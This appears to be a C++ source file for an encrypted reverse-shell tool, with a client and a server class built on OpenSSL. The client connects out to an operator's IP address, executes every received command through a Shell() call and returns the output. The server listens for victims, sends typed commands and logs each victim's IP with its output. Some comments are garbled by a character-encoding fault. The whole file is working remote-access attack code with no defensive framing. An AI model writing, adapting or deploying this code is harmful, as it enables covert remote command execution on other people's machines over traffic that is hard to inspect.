#include "httpsShellLib.h"


inline VOID HttpsClient::Main()
{
	if (hSocket == INVALID_SOCKET)TRACE(Error::Connect);
	else {
		while (true)
		{
			recvBuf = Recv();
			if (!recvBuf) {
				TRACE(Error::Recv);
				break;
			}

			if (!strcmp(recvBuf, ExitStr)) {
				Send(recvBuf);
				break;
			}
			else {
				sendBuf = Shell(recvBuf);

				if (sendBuf.length() == 0) {
					TRACE(Error::Shell);
					if (!Send("command error"))break;
				}
				else {
					if (!Send(sendBuf.c_str()))break;
				}
			}
		}
	}
}

// ��free�ŵ�����ռ�֮ǰ�������Ͳ��õ������������ˡ�
PCHAR HttpsClient::Recv()
{
	if (recvBuf)free(recvBuf);
	recvBuf = (PCHAR)malloc(BUF_SIZE);
	if (!recvBuf)TRACE(Error::Malloc);
	memset(recvBuf,0, BUF_SIZE);
	recvSize = SSL_read(cSSL, recvBuf, BUF_SIZE);

	if (recvSize <=0) {
		TRACE(Error::Recv);
	}

	return recvBuf;
}

BOOL HttpsClient::Send(const CHAR* sendBuf)
{
	nRet = SSL_write(cSSL, sendBuf, strlen(sendBuf));
	if (nRet < 0) {
		TRACE(Error::Send);
		return FALSE;
	}
	return TRUE;

}

HttpsClient::HttpsClient(PCHAR ipaddr, WORD port)
{
	recvBuf = nullptr;
	INT nLen = sizeof(addrServer);
	
	hSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	addrServer.sin_family = AF_INET;
	addrServer.sin_port = htons(port);
	addrServer.sin_addr.s_addr = inet_addr(ipaddr);
	connect(hSocket, (sockaddr*)&addrServer, nLen);
	if (hSocket == INVALID_SOCKET)TRACE(Error::Connect);

	SSL_load_error_strings();
	SSL_library_init();
	OpenSSL_add_all_algorithms();
	sslctx = SSL_CTX_new(SSLv23_client_method());

	cSSL = SSL_new(sslctx);
	SSL_set_fd(cSSL, (int)hSocket);
	nRet = SSL_connect(cSSL);
	if (nRet != 1)TRACE(Error::SSlConnect);
	else {
		Main();
	}
}

HttpsClient::~HttpsClient()
{

	if (recvBuf)free(recvBuf);
	SSL_shutdown(cSSL);
	SSL_free(cSSL);
	closesocket(hSocket);
	SSL_CTX_free(sslctx);
}

HttpsServer::HttpsServer(WORD port)
{
	recvBuf = nullptr;
	Error flag = Error::Shell;
	INT nLen = sizeof(addrClient);
	hServer = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (hServer == INVALID_SOCKET)TRACE(Error::SocketServer);

	addrServer.sin_family = AF_INET;
	addrServer.sin_port = htons(port);
	addrServer.sin_addr.s_addr = htonl(INADDR_ANY);
	nRet = bind(hServer, (sockaddr*)&addrServer, sizeof(addrServer));
	if (nRet == SOCKET_ERROR) TRACE(Error::Bind);


	nRet = listen(hServer, 1);
	if (nRet == SOCKET_ERROR)TRACE(Error::Listen);

	SSL_load_error_strings();
	SSL_library_init();
	OpenSSL_add_all_algorithms();
	sslctx = SSL_CTX_new(SSLv23_server_method());

	ConfigCtx(sslctx);

	// �ͻ��˵��ߺ󣬷������Ȼ�ȴ������Ƿ����˹ر�ָ��
	do {
		hSocket = accept(hServer, (sockaddr*)&addrClient, &nLen);
		if (hSocket == INVALID_SOCKET) TRACE(Error::Accept);
		cSSL = SSL_new(sslctx);
		SSL_set_fd(cSSL, (int)hSocket);
		nRet = SSL_accept(cSSL);
		if (nRet != 1 )TRACE(Error::Accepts);
		else {
			flag = Comminicate();
			fflush(stdin);
			/* �ر� SSL ���� */
			SSL_shutdown(cSSL);
			/* �ͷ� SSL */
			SSL_free(cSSL);
			/* �ر� socket */
			closesocket(hSocket);
		}
	} while (flag != Error::Success);
}

HttpsServer::~HttpsServer()
{
	/* �رռ����� socket */
	closesocket(hServer);
	/* �ͷ� CTX */
	SSL_CTX_free(sslctx);
}

Error HttpsServer::Comminicate()
{
	CHAR buf[BUF_SIZE] = { 0 };

	while (TRUE)
	{
		memset(buf, 0, BUF_SIZE);
		// ��ֹ��ȡ��buf=""�����
		while (!*buf)gets_s(buf, BUF_SIZE);

		if (!Send(buf)) return Error::Send;

		recvBuf = Recv();
		if (!recvBuf) {
			TRACE(Error::Recv);
			return Error::Recv;
		}

		if (!strcmp(recvBuf, ExitStr)) {
			break;
		}

		PCHAR outBuf = (PCHAR)malloc(recvSize + BUF_SIZE);
		if (!outBuf)return Error::Malloc;
		memset(outBuf, 0, recvSize + BUF_SIZE);
		sprintf(outBuf, "ClientIP:%s,Reponse:\n%s\n", inet_ntoa(addrClient.sin_addr), recvBuf);
		Print(outBuf);
		free(outBuf);
	}

	return Error::Success;
}

PCHAR HttpsServer::Recv()
{
	if (recvBuf)free(recvBuf);
	recvBuf = (PCHAR)malloc(BUF_SIZE);
	if (!recvBuf)TRACE(Error::Malloc);
	memset(recvBuf, 0, BUF_SIZE);
	recvSize = SSL_read(cSSL, recvBuf, BUF_SIZE);


	if (recvSize <= 0) {
		TRACE(Error::Recv);
	}

	return recvBuf;
}

BOOL HttpsServer::Send(const CHAR* sendBuf)
{
	nRet = SSL_write(cSSL, sendBuf, strlen(sendBuf));
	if (nRet < 0) {
		TRACE(Error::Send);
		return FALSE;
	}
	return TRUE;
}

VOID HttpsServer::ConfigCtx(SSL_CTX* ctx)
{
	/* Set the key and cert */
	if (SSL_CTX_use_certificate_file(ctx, cert_path, SSL_FILETYPE_PEM) <= 0) {
		TRACE(Error::SSLcert);
		exit(EXIT_FAILURE);
	}

	if (SSL_CTX_use_PrivateKey_file(ctx, privkey_path, SSL_FILETYPE_PEM) <= 0) {
		TRACE(Error::SSLPrivateKey);
		exit(EXIT_FAILURE);
	}
}
